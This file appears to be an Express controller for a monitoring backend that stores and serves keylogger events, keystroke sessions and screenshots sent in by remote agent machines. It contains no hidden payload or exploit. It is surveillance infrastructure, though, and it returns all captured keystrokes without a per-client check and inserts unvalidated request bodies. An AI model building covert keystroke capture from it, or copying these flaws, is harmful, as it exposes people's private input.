const { errorHandler } = require('../helpers/ErrorHandler')
const configurationsSchema = require('../schemas/configuration')
const keyloggerEventSchema = require('../schemas/keylogger-events')
const keyloggerSessionSchema = require('../schemas/keylogger-sessions')
const machinesSchema = require('../schemas/machines')
const policeSchema = require('../schemas/police')
const clientSchema = require('../schemas/client')
const screenshotsSchema = require('../schemas/screenshots')
const uploadQueuesSchema = require('../schemas/upload-queue')
const loggerEntrySchema = require('../schemas/logs')
const modelType = {
	configurations: configurationsSchema,
	keyloggerEvent: keyloggerEventSchema,
	KeySession: keyloggerSessionSchema,
	machines: machinesSchema,
	configs: policeSchema,
	screenshot: screenshotsSchema,
	uploadQueue: uploadQueuesSchema,
	loggerEntry: loggerEntrySchema,
}
const bulkGetDatas = async (req, res) => {
	try {
		const configurations = await configurationsSchema.find()
		const keyloggerEvent = await keyloggerEventSchema.find()
		const keyloggerSession = await keyloggerSessionSchema.find()
		const machines = await clientSchema.find()
		const police = await policeSchema.find()
		const screenshots = await screenshotsSchema.find()
		const uploadQueues = await uploadQueuesSchema.find()
		// const client = await clientSchema.findById(req.agent.id)

		res.status(200).send({
			message: 'SUCCESS',
			data: {
				configurations,
				keyloggerEvent,
				keyloggerSession,
				machines,
				screenshots,
				uploadQueues,
				configs: police[0],
			},
			success: true,
		})
	} catch (error) {
		errorHandler(error, res)
	}
}
const bulkCreateDatas = async (req, res) => {
	const type = req.query.type
	console.log(type, modelType[type])
	try {
		if (type === 'screenshot') {
			if (!req.file) {
				return res.status(400).json({ error: 'Fayl topilmadi' })
			}
			const BASE_URL = process.env.API_HOST
			const metadata = req.body || {}
			const serverFilePath = BASE_URL + `/screenshots/${req.file.filename}`
			const record = {
				PCName: metadata.PCName,
				ActiveWindowTitle: metadata.ActiveWindowTitle,
				ActiveProcessName: metadata.ActiveProcessName,
				FilePath: serverFilePath,
			}
			await screenshotsSchema.insertOne(record)
			res.status(201).json({
				message: 'Screeenshot created',
				data: { createdData: record },
				success: true,
			})
			return
		} else {
			await modelType[type].insertMany(req.body)
			res.status(201).send({ message: 'SUCCESS', data: null, success: true })
		}
	} catch (error) {
		errorHandler(error, res)
	}
}
const bulkGetConfigs = async (req, res) => {
	try {
		const police = await policeSchema.find()
		const client = await clientSchema.findById(req.agent.id)
		// console.log(police[0])
		res.status(200).send({
			message: 'SUCCESS',
			data: {
				configs: { ...police[0], auth_token: client.temp_token },
			},
			success: true,
		})
	} catch (error) {
		errorHandler(error, res)
	}
}

module.exports = {
	bulkCreateDatas,
	bulkGetDatas,
	bulkGetConfigs,
}
